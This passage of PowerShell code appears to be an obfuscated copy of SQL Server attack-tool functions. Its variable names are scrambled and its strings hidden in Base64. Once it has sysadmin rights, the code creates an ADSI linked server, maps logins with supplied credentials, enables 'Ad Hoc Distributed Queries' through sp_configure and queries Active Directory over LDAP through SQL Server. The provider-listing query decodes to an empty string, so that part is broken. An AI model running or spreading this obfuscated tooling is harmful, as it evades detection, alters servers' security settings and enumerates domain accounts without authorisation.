        $null = ${_/\/\/=\/\/\/\/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHMAdABlAGQAUQB1AGUAcgBpAGUAcwA=')))) 
        $null = ${_/\/\/=\/\/\/\/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AVAByAGEAbgBzAGEAYwB0AGUAZABVAHAAZABhAHQAZQBzAA==')))) 
        $null = ${_/\/\/=\/\/\/\/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBxAGwAUwBlAHIAdgBlAHIATABJAEsARQA='))))
        ${____/\/=\_/\/===\} = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            ${_/\/=\/=\/\/\____} = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + ${_/\/=\/=\/\/\____}
    }
    Process
    {
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + $_
    }
    End
    {
        ${____/\__/\_/=\__/} = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
                $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
            }
            if(${__/\_/=\/==\_/=\_})
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
                }
                return
            }
            ${__/\/==\____/\_/=} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
            if(${__/\/==\____/\_/=} -eq "No")
            {
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAVABoAGkAcwAgAGMAbwBtAG0AYQBuAGQAIAByAGUAcQB1AGkAcgBlAHMAIABzAHkAcwBhAGQAbQBpAG4AIABwAHIAaQB2AGkAbABlAGcAZQBzAC4AIABFAHgAaQB0AGkAbgBnAC4A')))  
                }              
                return
            }else{
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAWQBvAHUAIABoAGEAdgBlACAAcwB5AHMAYQBkAG0AaQBuACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuAA==')))
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARwByAGEAYgBiAGkAbgBnACAAbABpAHMAdAAgAG8AZgAgAHAAcgBvAHYAaQBkAGUAcgBzAC4A')))
                }
            }            
            $Query = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('')))
            ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            ${/=\_____/\/\/=\__} |
            % -Process {
                $null = ${_/\/\/=\/\/\/\/=\}.Rows.Add(
                    $ComputerName,
                    $Instance,
                    $_.ProviderName,
                    $_.ProviderDescription,
                    $_.ProviderParseName,
                    $_.AllowInProcess,
                    $_.DisallowAdHocAccess,
                    $_.DynamicParameters,
                    $_.IndexAsAccessPath,
                    $_.LevelZeroOnly,
                    $_.NestedQueries,
                    $_.NonTransactedUpdates,
                    $_.SqlServerLIKE
                )
            }
        }
        ${____/\/=\_/\/===\} | Invoke-Parallel -ScriptBlock ${____/\__/\_/=\__/} -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return ${_/\/\/=\/\/\/\/=\}
    }
}
Function  Get-SQLDomainObject
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.  This is the number of instance to process at a time')]
        [int]$Threads = 2,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Ldap path. domain/dc=domain,dc=local')]
        [string]$LdapPath,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Ldap filter. Example: (&(objectCategory=Person)(objectClass=user))')]
        [string]$LdapFilter,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Ldap fields. Example: samaccountname,name,admincount,whencreated,whenchanged,adspath')]
        [string]$LdapFields,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/=\_____/\/\/=\__} = New-Object -TypeName System.Data.DataTable
        ${___/\_/==\/\/=\_/} = New-Object -TypeName System.Data.DataTable         
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        ${_/==\_/==\___/\_/} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${__/===\/==\__/===} = ${_/==\_/==\___/\_/}.DomainName
        ${__/\/==\____/\_/=} = ${_/==\_/==\___/\_/}.IsSysadmin
        ${_/\__/\_/=\_____/} = ${_/==\_/==\___/\_/}.ServiceAccount
        ${____/=\_/===\__/\} = ${_/==\_/==\___/\_/}.SQLServerMajorVersion
        ${_/\/\/\/=\/==\_/\} = ${_/==\_/==\___/\_/}.SQLServerEdition
        ${__/\/=\_/\_/\/\__} = ${_/==\_/==\___/\_/}.SQLServerVersionNumber
        ${_/=\___/=\_/\/==\} = ${_/==\_/==\___/\_/}.Currentlogin
        If (-not($SuppressVerbose)){
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABpAG4AcwB0AGEAbgBjAGUAIAA6ACAATABvAGcAaQBuADoAIAAkAHsAXwAvAD0AXABfAF8AXwAvAD0AXABfAC8AXAAvAD0APQBcAH0A')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARABvAG0AYQBpAG4AOgAgACQAewBfAF8ALwA9AD0APQBcAC8APQA9AFwAXwBfAC8APQA9AD0AfQA=')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAVgBlAHIAcwBpAG8AbgA6ACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgACQAewBfAF8AXwBfAC8APQBcAF8ALwA9AD0APQBcAF8AXwAvAFwAfQAgACQAewBfAC8AXAAvAFwALwBcAC8APQBcAC8APQA9AFwAXwAvAFwAfQAgACgAJAB7AF8AXwAvAFwALwA9AFwAXwAvAFwAXwAvAFwALwBcAF8AXwB9ACkA')))
        }
        if(${__/\/==\____/\_/=} -eq "No")
        {
            If (-not($SuppressVerbose)){
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwB5AHMAYQBkAG0AaQBuADoAIABOAG8A')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAVABoAGkAcwAgAGMAbwBtAG0AYQBuAGQAIAByAGUAcQB1AGkAcgBlAHMAIABzAHkAcwBhAGQAbQBpAG4AIABwAHIAaQB2AGkAbABlAGcAZQBzAC4AIABFAHgAaQB0AGkAbgBnAC4A')))  
            }          
            return
        }else{
            If (-not($SuppressVerbose)){
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwB5AHMAYQBkAG0AaQBuADoAIABZAGUAcwA=')))
            }
        }          
        if (${_/=\___/=\_/\/==\} -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBcACoA'))))
        {
            if(($UseAdHoc) -or ($LinkPassword)){
            }else{
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQQAgAFMAUQBMACAATABvAGcAaQBuACAAdwBpAHQAaAAgAHMAeQBzAGEAZABtAGkAbgAgAHAAcgBpAHYAaQBsAGUAZwBlAHMAIABjAGEAbgBuAG8AdAAgAGUAeABlAGMAdQB0AGUAIABBAFMARABJACAAcQB1AGUAcgBpAGUAcwAgAHQAaAByAG8AdQBnAGgAIABhACAAbABpAG4AawBlAGQAIABzAGUAcgB2AGUAcgAgAGIAeQAgAGkAdABzAGUAbABmAC4A')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAVAByAHkAIABvAG4AZQAgAG8AZgAgAHQAaABlACAAZgBvAGwAbABvAHcAaQBuAGcAOgA=')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAIAAtACAAUgB1AG4AIAB0AGgAZQAgAGMAbwBtAG0AYQBuAGQAIABhAGcAYQBpAG4AIAB3AGkAdABoACAAdABoAGUAIAAtAFUAcwBlAEEAZABIAG8AYwAgAGYAbABhAGcAIAA=')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAIAAtACAAUgB1AG4AIAB0AGgAZQAgAGMAbwBtAG0AYQBuAGQAIABhAGcAYQBpAG4AIABhAG4AZAAgAHAAcgBvAHYAaQBkAGUAIAAtAEwAaQBuAGsAVQBzAGUAcgAgAGEAbgBkACAALQBMAGkAbgBrAFAAYQBzAHMAdwBvAHIAZAA=')))
                return
            }
        }
        if(-not $LdapPath ){
            $LdapPath = ${__/===\/==\__/===}
        }
        ${_/====\/==\/==\_/} = Get-SQLOleDbProvder -Instance $Instance -Username $Username -Password $Password -SuppressVerbose | Where ProviderName -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAHMARABTAE8ATwBiAGoAZQBjAHQA'))) | select AllowInProcess -ExpandProperty AllowInProcess
        if (${_/====\/==\/==\_/} -ne 1){
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQQBEAHMARABTAE8ATwBiAGoAZQBjAHQAIABwAHIAbwB2AGkAZABlAHIAIABhAGwAbABvAHcAZQBkACAAdABvACAAcgB1AG4AIABpAG4AIABwAHIAbwBjAGUAcwBzADoAIABOAG8A')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAVABoAGUAIABBAEQAcwBEAFMATwBPAGIAagBlAGMAdAAgAHAAcgBvAHYAaQBkAGUAcgAgAGkAcwAgAG4AbwB0ACAAYQBsAGwAbwB3AGUAZAAgAHQAbwAgAHIAdQBuACAAaQBuACAAcAByAG8AYwBlAHMAcwAuACAAUwB0AG8AcABwAGkAbgBnACAAbwBwAGUAcgBhAHQAaQBvAG4ALgA=')))
            return
        }else{
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQQBEAHMARABTAE8ATwBiAGoAZQBjAHQAIABwAHIAbwB2AGkAZABlAHIAIABhAGwAbABvAHcAZQBkACAAdABvACAAcgB1AG4AIABpAG4AIABwAHIAbwBjAGUAcwBzADoAIABZAGUAcwA=')))
        }
        if($UseAdHoc){
            If (-not($SuppressVerbose)){                
                if (${_/=\___/=\_/\/==\} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBcACoA')))){
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQB4AGUAYwB1AHQAaQBuAGcAIABpAG4AIABBAGQASABvAGMAIABtAG8AZABlACAAdQBzAGkAbgBnACAATwBwAGUAbgBSAG8AdwBTAGUAdAAgAGEAcwAgACcAJAB7AF8ALwA9AFwAXwBfAF8ALwA9AFwAXwAvAFwALwA9AD0AXAB9ACcALgA=')))
                }else{
                    if(-not $LinkUsername){
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQB4AGUAYwB1AHQAaQBuAGcAIABpAG4AIABBAGQASABvAGMAIABtAG8AZABlACAAdQBzAGkAbgBnACAATwBwAGUAbgBSAG8AdwBTAGUAdAAgAGEAcwAgAHQAaABlACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAHMAZQByAHYAaQBjAGUAIABhAGMAYwBvAHUAbgB0ACAAKAAkAHsAXwAvAFwAXwBfAC8AXABfAC8APQBcAF8AXwBfAF8AXwAvAH0AKQAuAA==')))
                    }else{
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQB4AGUAYwB1AHQAaQBuAGcAIABpAG4AIABBAGQASABvAGMAIABtAG8AZABlACAAdQBzAGkAbgBnACAATwBwAGUAbgBSAG8AdwBTAGUAdAAgAGEAcwAgACcAJABMAGkAbgBrAFUAcwBlAHIAbgBhAG0AZQAnAC4A')))
                    }
                }
            }
        }else{
            If (-not($SuppressVerbose)){
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQB4AGUAYwB1AHQAaQBuAGcAIABpAG4AIABMAGkAbgBrACAAbQBvAGQAZQAgAHUAcwBpAG4AZwAgAE8AcABlAG4AUQB1AGUAcgB5AC4A')))
            }
        }
        if(-not $UseAdHoc){
            ${/=\/=\__/==\_/=\/} = (-join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_}))                                
            If (-not($SuppressVerbose)){
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwByAGUAYQB0AGkAbgBnACAAQQBEAFMASQAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABsAGkAbgBrACAAbgBhAG0AZQBkACAAJAB7AC8APQBcAC8APQBcAF8AXwAvAD0APQBcAF8ALwA9AFwALwB9AC4A')))
            }
            ${_/\___/\/\___/=\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAtAC0AIABDAHIAZQBhAHQAZQAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABsAGkAbgBrACAAdABvACAAQQBEAFMASQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBGACAAKABTAEUATABFAEMAVAAgAGMAbwB1AG4AdAAoACoAKQAgAEYAUgBPAE0AIABtAGEAcwB0AGUAcgAuAC4AcwB5AHMAcwBlAHIAdgBlAHIAcwAgAFcASABFAFIARQAgAHMAcgB2AG4AYQBtAGUAIAA9ACAAJwAkAHsALwA9AFwALwA9AFwAXwBfAC8APQA9AFwAXwAvAD0AXAAvAH0AJwApACAAPQAgADAADQAKAAkAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBYAEUAQwAgAG0AYQBzAHQAZQByAC4AZABiAG8ALgBzAHAAXwBhAGQAZABsAGkAbgBrAGUAZABzAGUAcgB2AGUAcgAgAEAAcwBlAHIAdgBlAHIAIAA9ACAATgAnACQAewAvAD0AXAAvAD0AXABfAF8ALwA9AD0AXABfAC8APQBcAC8AfQAnACwAIAANAAoACQAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAHMAcgB2AHAAcgBvAGQAdQBjAHQAPQBOACcAQQBjAHQAaQB2AGUAIABEAGkAcgBlAGMAdABvAHIAeQAgAFMAZQByAHYAaQBjAGUAIABJAG4AdABlAHIAZgBhAGMAZQBzACcALAAgAA0ACgAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAcAByAG8AdgBpAGQAZQByAD0ATgAnAEEARABTAEQAUwBPAE8AYgBqAGUAYwB0ACcALAAgAA0ACgAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAZABhAHQAYQBzAHIAYwA9AE4AJwBhAGQAcwBkAGEAdABhAHMAbwB1AHIAYwBlACcADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUATABTAEUADQAKAAkAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBFAEwARQBDAFQAIAAnAFQAaABlACAAdABhAHIAZwBlAHQAIABTAFEATAAgAFMAZQByAHYAZQByACAAbABpAG4AawAgAGEAbAByAGUAYQBkAHkAIABlAHgAaQBzAHQAcwAuACcA')))
            ${__/=====\/\/=\_/\} = Get-SQLQuery -Instance $Instance -Query ${_/\___/\/\___/=\/} -Username $Username -Password $Password -Credential $Credential -ReturnError
            if(($LinkUsername) -and ($LinkPassword)){
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQQBzAHMAbwBjAGkAYQB0AGkAbgBnACAAbABvAGcAaQBuACAAJwAkAEwAaQBuAGsAVQBzAGUAcgBuAGEAbQBlACcAIAB3AGkAdABoACAAQQBEAFMASQAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABsAGkAbgBrACAAbgBhAG0AZQBkACAAJAB7AC8APQBcAC8APQBcAF8AXwAvAD0APQBcAF8ALwA9AFwALwB9AC4A')))
                }
                ${____/\______/\_/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBYAEUAQwAgAHMAcABfAGEAZABkAGwAaQBuAGsAZQBkAHMAcgB2AGwAbwBnAGkAbgAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAcgBtAHQAcwByAHYAbgBhAG0AZQA9AE4AJwAkAHsALwA9AFwALwA9AFwAXwBfAC8APQA9AFwAXwAvAD0AXAAvAH0AJwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAdQBzAGUAcwBlAGwAZgA9AE4AJwBGAGEAbABzAGUAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAbABvAGMAYQBsAGwAbwBnAGkAbgA9AE4AVQBMAEwALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAHIAbQB0AHUAcwBlAHIAPQBOACcAJABMAGkAbgBrAFUAcwBlAHIAbgBhAG0AZQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAByAG0AdABwAGEAcwBzAHcAbwByAGQAPQBOACcAJABMAGkAbgBrAFAAYQBzAHMAdwBvAHIAZAAnAA==')))                                           
            }else{
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQQBzAHMAbwBjAGkAYQB0AGkAbgBnACAAJwAkAHsAXwAvAD0AXABfAF8AXwAvAD0AXABfAC8AXAAvAD0APQBcAH0AJwAgAHcAaQB0AGgAIABBAEQAUwBJACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAGwAaQBuAGsAIABuAGEAbQBlAGQAIAAkAHsALwA9AFwALwA9AFwAXwBfAC8APQA9AFwAXwAvAD0AXAAvAH0ALgA=')))
                }
                ${____/\______/\_/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAtACAAQwB1AHIAcgBlAG4AdAAgAFUAcwBlAHIAIABDAG8AbgB0AGUAeAB0AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0ALQAgAE4AbwB0AGUAcwA6ACAAdABlAHMAdABpAG4AZwAgAHQAYgBkACwAIABzAHEAbAAgAGwAbwBnAGkAbgAgACgAbgBvAG4AIABzAHkAcwBhAGQAbQBpAG4AKQAsACAAcwBxAGwAIABsAG8AZwBpAG4AIAAoAHMAeQBzAGEAZABtAGkAbgApACwAIAB3AGkAbgBkAG8AdwBzACAAbABvAGcAaQBuACAAKABuAG8AbgBzAHkAcwBhAGQAbQBpAG4AKQAsACAAdwBpAG4AZABvAHcAcwAgAGwAbwBnAGkAbgAgACgAcwB5AHMAYQBkAG0AaQBuACkALAAgAC0AIAB0AGUAcwB0ACAAcABhAHMAcwB0AGgAcgB1ACAAYQBuAGQAIABwAHIAbwB2AGkAZABlAGQAIABjAHIAZQBkAHMAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAFgARQBDACAAcwBwAF8AYQBkAGQAbABpAG4AawBlAGQAcwByAHYAbABvAGcAaQBuACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAByAG0AdABzAHIAdgBuAGEAbQBlAD0ATgAnACQAewAvAD0AXAAvAD0AXABfAF8ALwA9AD0AXABfAC8APQBcAC8AfQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAB1AHMAZQBzAGUAbABmAD0ATgAnAFQAcgB1AGUAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAbABvAGMAYQBsAGwAbwBnAGkAbgA9AE4AVQBMAEwALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAHIAbQB0AHUAcwBlAHIAPQBOAFUATABMACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAByAG0AdABwAGEAcwBzAHcAbwByAGQAPQBOAFUATABMAA==')))
            }                                
            Get-SQLQuery -Instance $Instance -Query ${____/\______/\_/=} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose 
        }        
        if($UseAdHoc){
            ${/=\__/\/====\_/=\} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAB2AGEAbAB1AGUAXwBpAG4AXwB1AHMAZQAgAEYAUgBPAE0AIABtAGEAcwB0AGUAcgAuAHMAeQBzAC4AYwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgBzACAAVwBIAEUAUgBFACAAbgBhAG0AZQAgAGwAaQBrAGUAIAAnAHMAaABvAHcAIABhAGQAdgBhAG4AYwBlAGQAIABvAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select value_in_use -ExpandProperty value_in_use
            ${_/\___/\/\__/====} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAB2AGEAbAB1AGUAXwBpAG4AXwB1AHMAZQAgAEYAUgBPAE0AIABtAGEAcwB0AGUAcgAuAHMAeQBzAC4AYwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgBzACAAVwBIAEUAUgBFACAAbgBhAG0AZQAgAGwAaQBrAGUAIAAnAEEAZAAgAEgAbwBjACAARABpAHMAdAByAGkAYgB1AHQAZQBkACAAUQB1AGUAcgBpAGUAcwAnAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select value_in_use -ExpandProperty value_in_use
            if(${/=\__/\/====\_/=\} -eq 0){
                Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose                  
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGkAbgBnACAAJwBTAGgAbwB3ACAAQQBkAHYAYQBuAGMAZQBkACAATwBwAHQAaQBvAG4AcwAnAA==')))
                }
            }else{
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAJwBTAGgAbwB3ACAAQQBkAHYAYQBuAGMAZQBkACAATwBwAHQAaQBvAG4AcwAnACAAaQBzACAAYQBsAHIAZQBhAGQAeQAgAGUAbgBhAGIAbABlAGQA')))
                }
            }
            if(${_/\___/\/\__/====} -eq 0){               
                Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAEEAZAAgAEgAbwBjACAARABpAHMAdAByAGkAYgB1AHQAZQBkACAAUQB1AGUAcgBpAGUAcwAnACwAMQA7AFIARQBDAE8ATgBGAEkARwBVAFIARQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose                
                If (-not($SuppressVerbose)){
